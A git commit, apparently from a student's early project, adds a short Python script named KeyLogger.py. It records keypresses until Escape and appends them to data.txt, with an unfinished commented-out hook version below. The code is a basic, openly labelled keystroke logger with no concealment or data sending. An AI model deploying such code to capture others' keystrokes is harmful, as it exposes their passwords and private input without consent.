02f140657e99d8a236a9cd9b28f3ba2461676505
Martin Alvarez <malva408@fiu.edu>
2022-08-09 11:02:14 -0700

    First commit, basic logic but needs work.

---
+++ KeyLogger.py
@@ -0,0 +1,26 @@
+import keyboard
+
+
+def main():
+    keys_pressed = keyboard.record(until='escape')
+    file = open("data.txt", 'a')
+    # print(keys_pressed)
+    for event in keys_pressed:
+        if event.event_type == 'down':
+            if event.name == 'space':
+                file.write(" ")
+            elif event.name == 'right shift' or event.name == 'left shift' or event.name == 'shift' or event.name == 'esc':
+                continue
+            else:
+                file.write(event.name)
+
+
+if __name__ == "__main__":
+    main()
+# keyboard.hook(write())
+
+# def write():
+#     file = open("data.txt", "a")
+#     while True:
+#         file.write()
+# we are testing this again.
